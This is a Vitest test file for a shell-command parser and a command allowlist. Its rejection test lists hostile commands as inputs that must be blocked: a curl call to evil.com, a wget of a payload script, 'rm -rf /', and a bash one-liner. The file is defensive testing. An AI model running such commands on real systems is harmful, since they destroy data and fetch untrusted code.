import { describe, it, expect } from "vitest";
import { parseCommand, isCommandAllowed } from "../../src/utils/system.js";

describe("parseCommand", () => {
  it("splits simple commands by whitespace", () => {
    expect(parseCommand("echo hello")).toEqual(["echo", "hello"]);
  });

  it("handles single-quoted arguments", () => {
    expect(parseCommand("grep 'Server Version' file.log")).toEqual([
      "grep",
      "Server Version",
      "file.log",
    ]);
  });

  it("handles double-quoted arguments", () => {
    expect(parseCommand('echo "hello world"')).toEqual([
      "echo",
      "hello world",
    ]);
  });

  it("handles escaped characters", () => {
    expect(parseCommand("echo hello\\ world")).toEqual([
      "echo",
      "hello world",
    ]);
  });

  it("handles mixed quotes", () => {
    expect(parseCommand(`grep "it's here" file`)).toEqual([
      "grep",
      "it's here",
      "file",
    ]);
  });

  it("handles multiple spaces between args", () => {
    expect(parseCommand("echo    hello    world")).toEqual([
      "echo",
      "hello",
      "world",
    ]);
  });

  it("returns empty array for empty string", () => {
    expect(parseCommand("")).toEqual([]);
    expect(parseCommand("   ")).toEqual([]);
  });
});

describe("isCommandAllowed", () => {
  it("allows whitelisted version commands", () => {
    expect(isCommandAllowed("node --version")).toBe(true);
    expect(isCommandAllowed("npm --version")).toBe(true);
    expect(isCommandAllowed("git --version")).toBe(true);
    expect(isCommandAllowed("docker info")).toBe(true);
    expect(isCommandAllowed("python3 --version")).toBe(true);
  });

  it("rejects non-whitelisted commands", () => {
    expect(isCommandAllowed("curl https://evil.com")).toBe(false);
    expect(isCommandAllowed("rm -rf /")).toBe(false);
    expect(isCommandAllowed("wget http://payload.sh")).toBe(false);
    expect(isCommandAllowed("bash -c 'echo pwned'")).toBe(false);
  });

  it("is case-insensitive", () => {
    expect(isCommandAllowed("NODE --version")).toBe(true);
    expect(isCommandAllowed("Docker Info")).toBe(true);
  });

  it("does not allow partial prefix matches that are different commands", () => {
    // "node-gyp" starts with "node" but is not the same command
    // The allowlist checks for exact match OR prefix + space
    expect(isCommandAllowed("node-gyp rebuild")).toBe(false);
  });
});
